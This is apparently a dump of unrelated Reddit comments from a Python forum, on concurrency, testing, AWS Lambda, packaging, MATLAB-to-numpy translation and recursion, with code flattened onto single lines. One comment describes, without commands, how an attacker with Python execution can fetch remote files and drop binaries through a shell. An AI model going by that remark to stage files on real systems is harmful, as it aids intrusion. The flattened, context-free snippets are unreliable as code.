Hopefully this gives us a reasonable parallelism tool: https://www.python.org/dev/peps/pep-0554/
It could be. It could also be the latency in your internet connection. 
Actually, you can still see a similar pattern, but just less intense :)
Use Prolog? There are Prolog implementations in Python / bindings for Python, so, if it must be Python, it can still be Python. There's also something called Kanren, it's the logic part of Prolog (without I/O, meta-logic stuff etc.) Prolog would give you the ability to encode choices and decision procedure more naturally. The famous paper that gave example of Prolog usage: http://opim.wharton.upenn.edu/~sok/papers/s/p370-sergot.pdf here it takes British Nationality Act and translates it into Prolog program (the legal paper itself, basically, describes a decision procedure: if a subject is a child of British citizens, then she is a citizen, alternatively, if she was born on British territory... and so on).

Integration tests don't make unit tests less useful though. Integration tests are great, but when you have some complex workflow, maybe testing ingesting a file and creating data models, it'll take a while then just fail and you won't know exactly what failed, just that one system is broken. Unit tests are quick and tell you which specific functions broke. It's nice to know my data ingest is failing, but I'd rather know that `decode_rot13` specifically is changing behavior and potentially causing it. With good code structure unit tests can be amazingly useful and help you determine which functions broke, not just what functionality. And you can do more when they're quick as well. There's such a thing as binary search for commits that break unit tests using the bisect functionality. Give it a starting commit and an ending commit, and it'll do binary search to find which one exactly had a unit test start failing. Integration tests would take forever to do that. It's not one or the other. Unit tests and integration tests are both amazingly useful. Unit tests are testing your functions, integration tests are testing whether everything works together as a whole which unit tests can't cover. But unit tests can speed up debugging greatly by giving you the finest detail on what broke. I inherited a project where the previous dev just wrote integration tests for the most part, and it's seriously frustrating. When one test fails, sometimes it takes forever to debug because so many things it does could be broken but there's no detail. You can fix stuff before deploying to production, but that's only half of it. Integration tests are better than no tests, but debugging is still more painful than it needs to be.
In the data analytics field R is still pretty high up but it's slipping slowly over time. It is more convenient technically, there are a lot of 1 shot commands that are pretty helpful but really what you end up doing with python instead where you just make a few methods and keep them around isn't going to go out of fashion. 
This is a really nice collection but some of the links should be fixed
have a use case where I can process hundreds of hours of call center records. The recorded data does not differentiate between speakers. It might be possible to train a classifier to recognise the employees. I haven't done models with sound data, but I'm surprised at the performance of voice to text packages I've tried and a little surprised differentiating between speakers is not a solved problem. (yet also respecting it is a difficult problem) &amp;#x200B; &amp;#x200B;
Hi there! Staford's courses are pretty good and easy going. They have different courses that covers different subjects and levels of difficulties. Check out http://cs229.stanford.edu
IMO pgmock sounds like a really dangerous thing to have anywhere in your development environment. You don't want to have unit tests running all the way down to raw SQL access; that's what integration tests are for. Further running integration tests against anything but the full up-to-date schema is just dumb.

about the tradeoffs, sure. Though, we don't actually spin down the whole database; I want to say your whole database mode should be nearly as fast if you have a session fixture database server and a separate fixture which creates/drops the database you use. I think we gave 10 tests per second or something doing that, but still have full test isolation. Other than that, I'd like something like this to be publication available, but which uses docker-py to do the spin-up. i can assume all our devs have docker, I don't assume they have pg and that I should be mucking with it 
This looks great, but it's worth mentioning that if you're like me and the majority of your PostgreSQL projects are Django projects, using [pytest-django](https://pytest-django.readthedocs.io/en/latest/) and [Factory Boy](https://factoryboy.readthedocs.io/) is a better solution for mocking database access. For those other, non-Django Postgres projects, this is an interesting option.
An alternative would be an 'Undo' button. Generally speaking, it's best to actually do the thing someone wants, and give them the option to undo it if they realize that they made a mistake :)
What are you interested in making? Something for this kind of purpose, or something with a different motivation? The best motivation, as pseudo-c discovered, is something with a personal reason. Scratching an itch that *you* have is the best way to start writing software :)
I noticed you responded that several places - is that just because you're not familiar with it/don't know how to use it, or...?
\&gt; For example, the following perfectly reasonable code: ... My hackles are raised just seeing what is being imported!
OP here: No, it is not used anywhere else in the codebase. No idea what the history of this exception is. I feel like I might have been using it to get a more useful traceback when I was debugging something, but who really knows?
I love tkinter - even though it's ultra simple and basic, you can still do some great things with it. I explain it this way: Tkinter is like raw lumber and nails and screws. PyGTK, wxPython gives you some siding and paint. PyQT throws in the kitchen sink. (It basically has a [built-in clock](https://www.youtube.com/watch?v=dLMKvrmWB68))
If you have a mac or linux, open up your terminal right now and type: python -c "print('hello, world!')" And you've done it! If you have an android phone you could install termux and python3 on your phone and write code instead of playing Candy Crush or whatever game people are playing these days :D
I have a chromebook (I've installed crouton a few times) and I have an android phone with sololearn installed. I will find time one day in the future. 
I'm curious - what were you doing that you found multithreading necessary for?
I hope you're using the csv module :)
True, I have implemented this with a .lift() function.
C++ and Java has bumps in the fall and spring semesters of university. On the other hand, Javascript has bumps over the holidays, with the bigger one during summer, while PHP seems to spike in December.
I personally found working with lambda to be very unappealing. and I'm fairly sure each lambda task has a max duration of 5 minutes (you certainly pay more, the longer it's running). A task queue, seems like the best, lowest effort method to me. Im not sure I understand #4, but if you decide to go with celery, celery-beat does scheduled tasks. I'm sure most of the task queue libs have scheduled tasks. 
You should be using `multiprocessing.Queue` if you need a process-shared queue. `queue.Queue` is meant for threads.
Impressive, thanks! 
C is da best portable assembler, and it's absolutely terrifying for anything else.
That's really pretty much the crux of it. Django has a very specific way that it expects sites to be built - it was designed for the newsroom - and if you follow that model then you're going to be A-OK. If you want to step outside that? Woe be unto you! Flask, OTOH, expects you to either roll your own fiddly bits or pull in libraries that other people have written. For example, Django has a built in admin section. You have to build your own or add the flask-admin plugin. So I always tell people that it depends on what your goals are and how much control you want over the process.
I'm sorry, but you are ridiculous. You have time for browsing Reddit yet you claim you are so busy you can't even find few minutes a day to learning how to write a simple Hello world. Stop whining and looking for excuses. 
Sub-interpreters sound the right thing. Only problem is the implementation. The heredocs (python long-strings) suck ass. Would be great to have something like. import time import Python craziness = False def do_something(magic,ass,wiping=True): time.sleep(1) global craziness # for subinterpreters we create a magic channel in the background if magic &gt; ass and wiping: craziness = 5 return False return True print(craziness) subpython = Python(do_something(6,5)) print(craziness) # returns False time.sleep(5) print(craziness) # returns 5 print(subpython) # returns False
Eh. It didn't used to be. In the past, more lengthy text processing programs were frequently written in AWK. It's utility in that domain was more or less completely superseded by Perl and later Python and Ruby (etc.), but it is kind of the progenitor, and it's still not terrible for that kind of stuff. I'd recommend anyone spend a little time writing awk, just for the learning experience.
This seems like a really cool idea, and reminds me a lot of Golang’s concurrency model, which has proven to be powerful, performant, and relatively easy to reason about. I personally think this would be a great addition to Python’s set of tools for concurrent programming
ha i personally know this presenter he was the year above me in college(highschool to americans)
Are you serious? The buzz around Elixir has totally died, firstly. It was a language that had a tiny bit of buzz and effectively no industry use, for like 18 months. Secondly, awk and scheme are basically eternal technologies. It’s not surprising at all.
The reason why the implementation isn't like this is because whereas previously with Process objects are serialized and deserialized when passed, you don't pass objects here. You pass things that are meant to be *interpreted*, /hahaha. That said passing around code like this is a horrible practice. It's basically a different kind of `eval`. No thanks.
I am working on a data visualization project for school using Python and Bokeh. My first time working with Bokeh library and it's not the best of experiences :(
Vb.net is above c# makes me wonder is whatever their rankings based on accurate. 
We can limit it with contexts and other things. It was weird that pyv8 and pydermonkey supported things like this from the get go, but python can't run python natively
My intention is to plug it and use. Then unplug it and its not in the machine anymore
https://github.com/Hvass-Labs/TensorFlow-Tutorials Those are good and in-depth tensorflow tutorials.
Please please please reconsider 'utils'. &amp;#x200B; I know its tempting, but as a name 'utils' is meaningless. There isn't much code that couldn't be considered a utility of some kind. It will become a repository for hard to name things. Ditto 'tools'. &amp;#x200B; Better to keep your structure as flat as practically possible. Yes, naming things is hard; it's one of the 2 hardest things in computer science, together with cache invalidation and out by one errors. But if you can group your code in to descriptive namespaces, it will lend itself to self-documenting code. Future developers, even if that is just yourself, will thank you. &amp;#x200B;
oh god. im sorry. the easiest way to programmatically send ethereum using python possibly with a python library
Er... obviously? That's how `setup.py` works. It's an install script in a plaintext language. It is, by definition, arbitrary code execution.
Yes. I forgot to mention we do use miniconda but we end up needing a bunch of the scientific packages so it doesn't help too much.
There's this audio hosting site that depends on 3rd-party resources to function. Some of those resources are hosted by Google and double as trackers. If you block those, their player doesn't work. I prefer to browse without being spied on, so I want to create something that extracts the audio file URL from one of their pages and presents it to be played with the browser's native HTML5 player. I tried learning Python3 before, but it was hard to stay motivated without having a project. Now, I have one. I barely have a clue how to go about this, but I'm having fun figuring it out!
We use them to make sure that the environment/code that is running on my local machine is the exact one that gets dockerized. This helps avoid a lot of nasty surprises with version mismatch or dependency management. 
The lack of that pattern in developing countries also supports your supposition
Babie, no hurt me, no more. 
Thanks for your comment. I too am struggling and fighting with lambda at the moment, I believe the tooling / framework situation is still a few years out. 
Once I learn enough I want to do something similar as well. I'm very interested to see a possibility of scraping the web for news articles regarding "injuries" for teams and how that affects game outcomes.
That's good stuff. Config and deploying uwsgi is rather tedious and after doing NodeJS dev extensively it just feels very oldfashioned, slow, dumb ... Quart addresses these issues. One downside - it cannot be deployed to AWS EB natively because AWS EB doesn't natively support Python 3.7. I had to go back to Docker deployment that I hoped I won't need any more :) Thanks for good software!
The edx course I mentioned is free and very good. Week 2 starts today but the deadline for week 1 completion is 14 September, so there's still time to enroll. Somebody shared this link to Python for Social Science projects: https://nealcaren.github.io/python-tutorials/ There are a couple of interesting football projects there which might help you get started or inspire some ideas. Good luck with your project! 
Thanks, I appreciate the info on this.
It's still research, academic and applied. My coworker's on it.
How come Java is up there still?
This library has gotten me 3/4 through engineering school. I refuse to learn matlab and all anybody cares about is cool graphs. 
Glad to hear, but if you want to use them while in custom directories, you can still do it but you have to either specify the absolute path to the executable inside the Plugin config or add that path to the PATH environment variable.
Ok let us know when he solves it
Python 2.7
Maybe I'm missing something, but your "perfectly reasonable code" really doesn't make much sense as an example. You can't expect a `Queue` meant to share data between threads to have its underlying locking mechanisms work when multiple processes are involved. Not to mention that the way things are being configured outside of a `if __name__ == "__main__"` block are going to cause problems. I get that this is part of the point of your post, which I think is overall a good overview of the things you have to keep in mind when working with multiprocessing. The example of something that "should" work just seems a bit too naive is all.
Because "java runs on 3 billion devices" ™ My question is why did VB.NET jump up 3 spots?
Python can do everything matlab can do and more - and its free. Albeit the linear algebra in matlab is 10 times easier, but thats what you get from a language named matrix laboratory. 
I've seen what you're describing done a bunch, and it's not terrible. I hate it when I run into it in an open source project because it makes reading the source code much harder - now if I want to see the definition of something from `utils` I either need to search the whole `utils` module or I need to have a working environment set up that I can use static analysis tools to navigate - so that's pretty annoying. I'd definitely discourage this pattern for any project where you want to have outside contributors - the downside far outweighs the tiny benefit. Still, if it's just you, or a handful of friends, it's not terrible. Be aware that if you define two variables with the same name in different `utils` files one is going to shadow the other - so you need to be careful with any globally scoped variable names in any of the imported files. I will also second what /u/willm said. I sometimes get lazy and have a `utils` module too, but it really is a bad practice. At the least having purpose-specific utils modules (`slack_utils` etc.) makes it a lot easier to make sense of a code base. Basically, the `utils` pattern you're sketching out here is great if you're a lone developer working on a hobby project, but quickly becomes annoying on larger projects with larger teams.
I mean if you can use mpl like a pro then you basically can code in matlab anyway. It would not take you more then a few hours to figure it out.
Well you shouldn't. Elixir is exactly what you said. A lot of buzz. This list is tracking actual use which will lag behind the buzz by many years. Also shit tons still use especially Awk and Tcl still.
You use for for &lt;any-character&gt; separated records. And for some people like myself that means you use it all the time (like almost every day).
The only thing I am having a hard time with is the apostrophe command in matlab. It has some equivalents in python but feeding it into the correct functions the right way to generate transfer functions seems to be a bit tricky at the moment and I just don't have the time to learn how to do it when I have a solutions manual written in matlab. Engineering school moves too fast paced to learn much extra in the way of language barriers of this sort. I have not had any problems with anything else, though I did not take linear algebra. 
Can you please also share your experience using AWS lambda, I still like to clinging onto a server/instance. What are the use cases where AWS lambda shines? 
The same situation here, perhaps the only way is to concentrate and try harder with all your possibilities and see the result. 
Take a deep breath and relax a bit! Python is one of the most easiest thing to pickup on planet. I've trained about 50 odd people who went from having no knowledge about python to using it professionally as part of their daily job. Here is [Quora post](https://www.quora.com/What-are-typical-career-paths-for-Python-Developers/answer/Sidharth-Shah?share=750bd8d9) which covers some of my success stories. Before you read anything on Python I would suggest reading [Teach Yourself Programming in Ten Years](http://norvig.com/21-days.html), its worth reading. **Keep Patience and Keep Practising** I've written few newbie friendly posts on Quora 1. [On average, how long does it take for a newbie to learn the general fundamentals and functions of Python if it’s their first language?](https://www.quora.com/On-average-how-long-does-it-take-for-a-newbie-to-learn-the-general-fundamentals-and-functions-of-Python-if-it%E2%80%99s-their-first-language) 1. [What can I do once I have learned all the basics in Python?](https://www.quora.com/What-can-I-do-once-I-have-learned-all-the-basics-in-Python) There are enough pointers in both this post to get you started and keep going at it. 
They are similar to that PEP proposition above. But basically you create a context of execution with variables you need to expose and run a script over it. Script is a string. But then again it's the string eval which sucks
**She**, and for a very narrow application. There is no general model of any decent performance right now AFAIK… at least not as a web API, nor an OSS project, etc. I did not mean to imply that she could solve it all on her own.
I used it many years ago and my problem was just getting a nonblocking GUI
I *love* Lambda. I use it whenever I can and it makes sense to for the project. I use it for automating all kinds of stuff. Dev server shutdowns at night, monitoring stream services to make sure they're receiving data properly, reminder emails/Slack messages to project teams, updating the phone number weekly for our on-call staff member, setting up response headers for CloudFront...the list goes on. The main draw for me is that I don't need to maintain a server. I've just got my code and it runs when I want. It containerizes my functions so I don't have to worry about setting up my own virtual environment or docker container for each one, and I don't need to worry about conflicting dependencies. I run dozens of functions on there, and I'm *still* in the free usage tier. I've only used the Python and Node.js runtimes for Lambda. I can't speak to any of the others, but I am, needless to say, I'm a big fan of the Python runtime. The only thing holding me back from it previously was lack of Python 3 support, but they added that about a year ago and I've never looked back.
They already have execution with python, urllib is more than enough to pull remote files. Also, base64 and copy/paste is sufficient for dropping small binaries onto any system given an ASCII shell.
Neat. Good luck! If you have any questions you can shoot me a message.
Sure thing!
&gt;**up to the access level of whoever ran the command.** The last point is super good to keep in mind. This is why permissions and such exist and why you shouldn't just give your daily user account control over anything important. Anyone that did this to me would still need to know my password to access anything important or do any damage.
I agree. Need to use the correct implementation for communicating across processes. I would like to add, get rid of threading altogether and just use mutliprocessing for all things.
OOP is superfluous here. I believe the data structure that you are looking for is a dictionary. PRONOUNS={'MALE':('HE', 'HIM'), 'FEMALE':('SHE', 'HER')} Then, you can just have person implemented like this: class Person: PRONOUNS={'MALE':('HE', 'HIM'), 'FEMALE':('SHE', 'HER')} def __init__(self, gender): self.nominative, self.objective = self.PRONOUNS[gender] 
I am half way through reading Learning Python by Mark Lutz. It seems really good but is a very long read and I found myself losing grip on concepts as I read on so I decided to just try and make something. On top of this, I have watched youtube videos, googled etc. I made the above in a weekend but I would say it would have been made a lot faster by someone who wasn't learning as they go. 
&gt; just use mutliprocessing for all things. This is not necessarily good advice. The story is pretty complex and it depends on not only what you are doing, but also on what you are using. For example, the MKL-enhanced versions of Numpy that ship with Anaconda/miniconda internally implement things with GIL-released multithreading. In such cases, you're often times better off using Python threads because there's significantly less overhead involved. If you're just doing something simple and I/O bound, threads can often give you better performance than processes. Rules of thumb are good, but when it comes to concurrency and parallelism, optimization can frequently require a lot of trial and error as well as a fundamental understanding of what all is going on under the hood.
By 'apostrophe command' do you mean just taking the transpose of something? numpy.transpose(x) If you're ever looking for basic translations between matlab and python, checkout: http://mathesaurus.sourceforge.net/matlab-numpy.html
My 2 cents: I haven't watched the video but from the preview I see you use \`object\` as a variable name, which is in Python3 reserved &lt;type [https://docs.python.org/3/glossary.html#term-new-style-class](https://docs.python.org/3/glossary.html#term-new-style-class)
Some input here, as I work on call center architecture and now getting into speech analytics with a major VoIP company. &amp;#x200B; Your recordings are likely single channel (mono), and understanding who is who based on voice and training models is an incredible undertaking. &amp;#x200B; I will assume that your Call center platform is VoIP/SIP, and perhaps customizing the PBX or Media-server to produce a Stereo recording with Left Channel (1st) being the Caller/Callee, and the Right (2nd) channel to be agent/CSR, would be less undertaking with more reliability.

What would you recommend for spacecraft trajectory? genuinely curious to learn what sort of tools one uses in such an interesting field.
Matlab and Origin

It's pretty interesting !
Recursion is simply one tool within programming, so it's not going to be useful everywhere. Sometimes recursion is the simplest way to express how to solve a problem. Such as searching a binary search tree. This didn't necessarily mean it's the fastest way to solve that problem. In that case of search, recursion has to deal with a lot of memory overhead and work from going deeper, so iteration might be faster. Another example of a place it's useful is math problems. An equation such as: 5 + (5 * 8) Is basically recursive in nature, so we should do the same set of things on the overall equation as we do on the part within the parens.
Seriously, where are all these people writing VB.NET hiding?
Quicksort's most common implementations uses recursion. Many operations on tree data structures do as well. It really depends on what are you trying to do, but recursion can be very useful at times. Useful does not necessarily mean efficient (as with your example), but it might simplify an iterative approach by a whole lot.
I feel re-assured after reading your comment because I was mostly thinking of the scientific community and technical artists when I wrote Snowy. PIL / ImageMagick / OpenCV still make sense for a lot of use cases. I probably need to come up with a better one-sentence description of Snowy to make it clear it doesn't try to compete with those.
Octave is a decent substitute for matlab
I wrote a Boggle board solver that used recursion. Classic examples of recursion include factorial calculators and Fibonacci generators. 
I wouldn't recommend using root to install a python package...
As others commented, the first step is try to be more positive. If you begin from a position of fear, it'll be harder. About indentation: use an editor designed for python, like pycharm, and let it indent for you. About how to begin: Maybe you should try the most basic problems, just to get confidence
Just curious what is the mitchell filter and why is it the default? Is this a "standard" for this kind of work? 
I'm enjoying the idea behind the commit msgs. :) Though I think it could be better executed. Maybe make the tags standardized. https://github.com/techcentaur/The-GrandFather/commits/master Fun project!
Mitchell is the default for magnification and Lanczos is the default for minification. These simply refer to the shape of the filter, and they're fairly standard.
Can you post your setup.py file?
Things that I consider feature creep are typical 2D vector drawing primitives (e.g. SVG stuff) and adding more file formats beyond PNG/JPEG/EXR. (In fact I almost omitted load/save from the library.) Adding a function that creates contour lines sounds great.
Here you go: from distutils.core import setup from myPackage import __version__, __package_name__ from setuptools import dist, find_packages # declare usage of the functions _ = dist _ = find_packages # needed for run "python setup.py sdist", # for install_requires and python_requires options if __name__ == '__main__': setup( name=__package_name__, version=__version__, description='mypackage', author='xxx', author_email='redacted', maintainer='redacted', maintainer_email='redacted', license='redacted', packages=['myPackage'], keywords='redacted', python_requires='&gt;3.5.0, &lt;3.7.0', install_requires=[ 'numpy&gt;=1.13.0', ], url='redacted' ) 
I'll have to think about it. I think it could be useful, and I probably have the background, but it is a question of time. I'll poke at your lib a bit in the next few weeks and see. No promises (the curse of open source - millions of people who say they'll help and then do nothing...)

I think I just realized what's going on. I'm installing these things to a different location (--user, exporting $PYTHONUSERBASE) but the module's import doesn't add that userbase to the sys.path. Can I somehow do this in the environment instead of in the code?
No. That's why I'm now looking into multi stage builds. It should help remove gcc, pip and any other stuff that conda keeps to build the environment. 
E X C I T I N G
Would love to know what kind of functionality it's got.
Try asking the people who posted in [this thread](https://www.reddit.com/r/Python/comments/9d9eue/who_here_uses_recursion/).
In Excel spreadsheets in my guess.
This little snippet draws three black contour lines, the thickness of each line spanning an elevation of 10 units, and the spacing of each line spanning 30 units. contour = lambda L, U: np.where(np.logical_and(img&gt;L, img&lt;U), -img, 0) img += contour(20, 30) + contour(60, 70) + contour(100, 110) 
I'm a bit of a noob, so mainly printing and taking input. 
Yes but then you need to feed it into a ss2tf() or some kind of symbolic math function and it falls apart. 
Yeah it just lets you get passed the restrictions 
I know it's been three months since this comment, but I want to congratulate you. Awesome response. Cheers
IDE stands for Integrated Development Environment. It's a tool to speed up your programming. I would advise getting [Mu](https://codewith.mu/en/) as it's targeted at beginners. You're still going to need to download the [Python Interpreter](https://www.python.org/downloads/), which is the software that actually runs the code. Thing of an IDE like Microsoft Word, but for a programming language instead of English. You could write code from a raw text editor (like notepad), but it would take a lot longer because it doesn't have a lot of features that make life easier. It sounds like you also want to make a GUI (graphical user interface). I'm going to guess you want one for gaming, there are a ton to choose from. Google is your friend. [Pygame](https://www.pygame.org/news) is a great one, but i'd suggest doing your own research. There's a lot that goes into writing an app. You're going to need to get familiar with Python's package manager [pip](https://pypi.org/project/pip/), and I would suggest starting with something small. Little games like Hangman are a great place to start, again, it's up to you.
It is the conjugate transpose operator. I saw another tutorial on how you can use a = np.array(&lt;stuff&gt;) a_apostrophe = np.atleast_2d(a).T.conj() In MATLAB: numg = [-5 70]; deng = [0 -45 -55 (roots([1 7 110]))' (roots([1 6 95]))']; Gtf = tf(numg, deng) G = zpk(Gtf) [r, p, k] = residue(numg,deng)
Is this job still open. I’m willing to get started ASAP. [heres](https://github.com/MoHKale) my GitHub.
&gt; from distutils.core import setup Nooooo, don't do that! Use setuptools! Using distutils will cause you no end of pain, especially if you're trying to use setuptools at the same time.
A lot of data structures are recursive in nature. Take a binary tree, which is composed of a node whose children are themselves binary trees. When you're operating on a recursive data structure, the algorithms you use tend to be recursive too. 
Locate the interpreter on your computer (an executable called `python`) and supply its path to the editor.
If you make your array into a numpy matrix, you can just use this. https://docs.scipy.org/doc/numpy/reference/generated/numpy.matrix.H.html
Your `setup.py` should not try to import your package. When the `setup.py` code is run your package has not been installed yet so you can't import it. Remove the second line and just use literal values for name and version.

Thank you. I did not use PyCharm since it was a small amount of code and missed it. I have to admit that though most of my programming career, shadowing in the local scope was OK. But I do understand with Python exposing over 150 builtin names, this is a more important issue. I will add you comment above to the video site comments.
Tried making this change and still getting the same results. :( I also tried removing `from distutils.core import setup` as well. I should add that the package I'm installing was provided by a client and I'm just trying to get it running in our environment.
If I use setuptools for this, does the package layout or config need to change elsewhere? This module was provided by a client so I'm just going off of what they give me, but if I can get it to install properly in my environment I can provide feedback to have them change it. I attempted to remove the `from distutils.core import setup` and replace it with `from setuptools import dist, find_packages, setup` but I'm still getting the same error. 
In general, you won't find any application of recursion that's not outperformed by an iterative solution. It's definitely easier to find a solution to a problem recursively rather than iteratively, but recursion is computer science's equivalent of cursive-They teach it only so you can understand and improve on other stuff that uses it.
Thank you, this solved the problem! I understand the principal behind it, but not sure why it didn't just say something or resolve the dependency like it was supposed to.
It's a decent substitue for MATLAB if you have to write MATLAB code and don't have personal access to MATLAB. Otherwise there are IMO better alternatives to MATLAB like the scientific stack of Python or the Julia programming language.
I'm relatively new to Python, but data science includes some key concepts that machine learning utilizes.
Thanks!
How much faster is it than PIL?
Is that so, i don't really like the data stuffs thats why i wanted to know.
More importantly, Pillow-SIMD
I hope you don't mean this in general-- in other languages the compiler can optimize in ways such that the recursive solution is better than the iterative one.
Does numba inflate the memory footprint and cause gross import and first run times here?
https://pastebin.com/e63k79L6 I wanna make him abot someday. For now I have this though &lt;3
I'm also interested in possibly contributing, would be nice to see what expansions you envision for the lib.
How can you go to machine learning if you don't know data science?!!!
Thanks that makes sense. I found this below which seems to be an argument against hardcoding the version like mentioned: `The version attribute in a classic distutils setup.py file, or the PEP 345 [7] Version metadata field SHOULD be derived from the __version__ field, or vice versa.` Is that not a best practice any longer?
i an just starting out so i don't know that much about what to learn as a beginner.I thought i did not had to learn data science 
See: https://stackoverflow.com/questions/3982036/how-can-i-use-valgrind-with-python-c-extensions#6037350 I have a copy of the official Python suppression file here: https://github.com/pydata/numexpr/blob/numexpr-3.0/valgrind-python.supp This is the bash file I run: #!/bin/bash # http://svn.python.org/projects/python/trunk/Misc/README.valgrind # http://stackoverflow.com/questions/3982036/how-can-i-use-valgrind-with-python-c-extensions valgrind --tool=memcheck --leak-check=full -v --suppressions=valgrind-python.supp \ python -E -tt numexpr3/tests/simple_ne3.py Obviously run your own simple test that doesn't generate hundreds of thousands of lines of output. A piece of advice: it's easier to use Valgrind with Python 3.5. Python 3.6 added a memory arena and Valgrind doesn't like it. Someone at some point might update the official Python Valgrind suppression file but it hasn't happened yet. This might not be the case with the `--without-malloc` flag but I haven't bothered. I just run with Anaconda's `python.exe`.

What problem are they solving, and how would they compare in terms of speed to the fastest language using the iterative solution?
Looks good. I'm quite interested to play with this actually, as some of the things like distance functions look like they could be useful to me. I ported Peck's `FastNoiseSIMD` library to Python (https://github.com/robbmcleod/pyfastnoisesimd) and a number of things you have here would be fun for post-processing. One suggestion I might make, `numba`s initial compilation can be a bit long. You can restrict the data types and array shapes in your `@jit` decorators, which helps a lot. A more involved solution is to generate the `numba` functions at install time and `pickle` them to disk. Then when the module is imported, you can monkey-patch your protected `numba` functions. 
I agree that this is an issue, and that in an ideal world we wouldn't duplicate the information. But this is a difficult problem and we don't currently have a good solution. The best thing to do right now is to forgo the `__version__` field and just rely on pip to know the versions (via `setup.py`) of the packages that are installed. You could set up some complicated situation where both the package and the `setup.py` read the version and stuff in from an external data file, but that might be overkill.
&gt; Is that memory arena why the official suppression file didn't do a thing when I tried it? I'm compiling python3.5 as we speak and will report the results. In my experience, yes.
No, it can make it so that it’s equivalent, not better. 
In that case, something is really fishy. I compiled python3.5 with the flags in the OP and it still didn't do anything. `(suppressed: 0 from 0)` Should I try to find a precompiled binary for my distribution?
I dunno. Too many unknowns for me. I just ran my bash test script and I got with Python 3.5.3 obtained from the `conda` Intel channel and it results in 15 errors (none of which belong to me) and 2879 suppressions. There might be difference between the bash script I posted and what you're running, and who knows what else. 
Interestingly, I do get some things suppressed if I use the default configuration when compiling python. `ERROR SUMMARY: 1479 errors from 5 contexts (suppressed: 224 from 52)`
And if you grep for your module?
There's nothing about my module, but I need a clean valgrind run in order to use it as part of CI. I've updated the gist. At the bottom of it, there's a new file that is "only" ~500 lines long. It's with the simplest start-stop interpreter, and non-debug python3.5.
why is it not related to python.. i code in python and i am starting machine learning with python so it is related..What do you mean my not realed please clarity

The values should probably be stored in a database for fast lookup and querying - to make things simple you could use SQLite which is a simple file-based database, rather than having to set up Postgres or Mysql or something. The web form should probably be a simple HTML page that POSTs the data to a controller. Make sure you PARAMETERIZE/SANITIZE your input to avoid malicious users. There are a number of libraries that can take an HTML template and make it a PDF. I would recommend loading a submission from your saved data, filling the data out into an HTML template and turning that into a PDF. [StackOverflow](http://stackoverflow.com) is a good resource for questions on how to use specific libraries and functions. Chances are someone has already asked your question before and you just need to search for it.
Awesome! I’ve been wondering how to do something like `rbspy` for Python ever since I heard about it. My biggest road block was figuring out where in memory to look for the Python interpreter’s stack, which is hard when you’ve never delved into CPython internals before. It looks like you give a brief explanation of how to do that, so I’ll be diving into this to understand how it works at some point :)
Maybe if people wrote more low level code and fighting the borrow checker weren't such a pain.
Finally finishing my master's thesis which would've impossible to do without Python, NLTK and the numFOCUS projects (among other things). So stoked! 😍
This looks really cool! I might have a project in mind for it already. You mentioned in another comment that this is not intended to compete with PIL/opencv/etc., so does that mean that finding contours in images as a future feature is out of the question?
PIL is written in C, so I presume this isn't intended to compete with that on speed. It's interesting that Snowy is pure Python, which means that it should be easy to port to Python environments other than the standard CPython. Numba is a JIT compiler that accelerates CPython modules (written with a subset of Python) to a speed that is still less than C but very much faster than CPython. I'll note that Numba depends on the LLVM compiler, and can't really be installed with PIP. Recent Linux distros have it packaged but it draws in a ton of large dependencies. Anaconda has it, so long as you don't mind its multi-Gb install size.
Huh, yeah... guess I didn't look into this too much. On second thought, it does look like it's a way overcomplicated way to go about unit testing. Most of us should probably be just mocking ORM calls, django or otherwise. I'd patch `User.objects.filter` before I touch anything SQL related.

FWIW and AFAIK, `iterable` is a common variable for iterables and not built-in, and `it` is commonly used for an iterator (but also, `iterator` is not built-in either). For an example, I use this often to generate overlapping pairs of things in an iterable: def pairgen(iterable): it = iter(iterable) prev = next(it) for curr in it: yield (prev, curr) prev = curr

&gt;A high-income economy is defined by the World Bank as a country with a gross national income per capita US$12,056 or more in 2017, calculated using the Atlas method.

\- stopword lists should contain contractions already and it is not necessary to split these words into their constituent parts (if you encounter escaped apostrophes in contractions just replace \\' with ' and then go straight into stopword removal) \- you don't have to turn string.punctuation into a list in order to iterate over the punctuation marks individually \- you can also remove punctuation using a list comprehension the same way you did with the stopwords \- my personal preference would to call punctuation\_remove() from within clean() instead of stopwords\_remove() \- you can assign the output of split to separate variables rather than indexing a single variable &amp;#x200B; speaker, line = myline.split(":", 1) &amp;#x200B; \- if you choose to do what I outline above, nest this within a try clause and catch ValueError for when the line does not contain a semicolon \- when you use BigramAssocMeasures() you can pass a parameter that calculates frequency based off something other than raw frequency. This is a way to easily implement tf-idf like another user suggested. \- in one file you start to sprinkle in some camel case variable names and it conflicts with the use of underscores in the majority of the code \- from a quick glance i think you import packages that you do not end up using with the code and it is good to remove these

Ok, that’s interesting. But my reason for saying that is for me to say how much faster is it is more along the lines of why would I switch from PIL to this new image library. I’m quite good at PIL and for me to switch over I have to know that this new image library is much faster not just a little faster.

My lightweight framework for building command-line Python applications: #!/usr/bin/env python It's a little verbose, but it covers all my cases.
Wait, 18 years old???? 
In my opinion its better to specify python2/python3, had enough scripts not working simply because they didn't call python2 explicitly and the world moved on to python3 as the python default
OK, so I actually kind of lied. I have a whole set of packages plus a environment setup script I run first. That puts my exact version of python first in the path, which enabled the above "framework". Still, you are right--I should put `python2` in there if only so I can easily `grep` which ones need fixing when I upgrade.
I'm not watching this in an airport. Can someone explain the seeming drama in this thread?
Guess you're not the target audience.
A leak detection with pandas. To control a countries water network. 
Well, it's me, but I'm not this kid.
I get that this is now the standard answer whenever someone asks a cx_freeze question, but I'm well aware of pyinstaller and I have reasons to need and prefer cx_freeze.
Also wanted to point out [PEP 394](https://www.python.org/dev/peps/pep-0394/) if you're not aware. Think the safe and "expected" thing to do at least until Python 3 becomes default on popular platform installs (e.g. RHEL, OS X) 
I tried using PyXB for this once. It's not great... but it kind of works. It can generate Python classes that can be later serialized into XML (thus ensuring the schema validity). Things I didn't like about it: the names it generates for anonymous types are awful (one would expect that those would be derived from node names, for example, but they are not...) The generated code quality isn't that great, and all of it gets generated into a single file, which, if you have a reasonably big schema will be huge (and hard to edit / straining for Python's parser). But, this is a starting point. Once you have that, you can kind of figure out how generated classes are related to each other, and how to generate objects from those classes. The documentation is awful, and most of the time you'll be fishing for information with debugger and `dir()` etc. but this is what there is. I didn't find anything better.
